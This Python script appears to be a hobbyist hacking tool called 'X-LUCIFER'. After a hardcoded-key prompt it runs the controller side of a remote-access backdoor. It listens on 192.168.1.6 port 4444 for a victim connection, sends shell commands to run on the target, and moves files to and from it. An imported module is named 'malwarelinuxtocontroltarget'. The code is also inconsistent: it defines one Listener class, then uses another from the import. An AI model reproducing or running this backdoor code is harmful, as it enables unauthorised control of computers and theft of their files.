from pip._vendor.distlib.compat import raw_input
from colorama import Fore, Back, Style
import time

find = "tsb"
guess = ""
while True:
    def prRed(skk):
        print("\033[91m {}\033[00m".format(skk))


    def prGreen(skk):
        print("\033[92m {}\033[00m".format(skk))


    def prYellow(skk):
        print("\033[93m {}\033[00m".format(skk))


    def prLightPurple(skk):
        print("\033[94m {}\033[00m".format(skk))


    def prPurple(skk):
        print("\033[95m {}\033[00m".format(skk))


    def prCyan(skk):
        print("\033[96m {}\033[00m".format(skk))


    def prLightGray(skk):
        print("\033[97m {}\033[00m".format(skk))


    def prBlack(skk):
        print("\033[98m {}\033[00m".format(skk))


    guess = raw_input("\033[93m \nEnter The Key For Exploit-->\033[00m ")

    if guess != find:

        prRed("Fuck You")

    else:

        prPurple("\nInitialize........")
        time.sleep(3)
        prPurple("\n\n" + "\t\t\t\t" + "\033[5;37;40mWELCOME TO X-LUCIFER\033[0;37;40m\n")

        prRed("\n\t\t\t\tHack The World Buddy\n\n")


        # !/usr/bin/env python

        import socket, json, base64

        from pip._vendor.distlib.compat import raw_input


        class Listener:
            def __init__(self, ip, port):
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                    1)  # cerating socket to reuse the connection 1 is enable the option
                listener.bind((ip, port))  # listening the incomming connection
                listener.listen(
                    0)  # it is basically a number of connection that can be queued the system starts to refusing the connection
                print("[+] waiting for incomming connection")
                self.connection, address = listener.accept()
                print("[+] got a connection from " + str(address))

            def reliable_send(self, data):
                json_data = json.dumps(data)
                self.connection.send(json_data)

            def reliable_receive(self):
                json_data = ""
                while True:
                    try:
                        json_data = json_data + self.connection.recv(1024)
                        return json.loads(json_data)
                    except ValueError:
                        continue

            def execute_remotely(self, command):
                self.reliable_send(command)
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                return self.reliable_receive()

            def write_file(self, path, content):
                with open(path, "wb") as file:
                    file.write(base64.b64decode(content))
                    return "HEY DOWNLOADED SUCCESSFULLY."

            def read_file(self, path):
                with open(path, "rb") as file:
                    return base64.b64encode(file.read())

            def run(self):
                while True:
                    command = raw_input(">> ")
                    command = command.split(" ")
                    try:
                        if command[0] == "upload":
                            file_content = self.read_file(command[1])
                            command.append(file_content)
                        result = self.execute_remotely(command)
                        if command[0] == "download" and "[-] Error" not in result:
                            result = self.write_file(command[1], result)
                    except Exception:
                        result = "Error during Command Execution"

                    print(result)


        import malwarelinuxtocontroltarget

        mylistener = malwarelinuxtocontroltarget.Listener(" 192.168.1.6", 4444)
        mylistener.run()

        exit(guess == find)


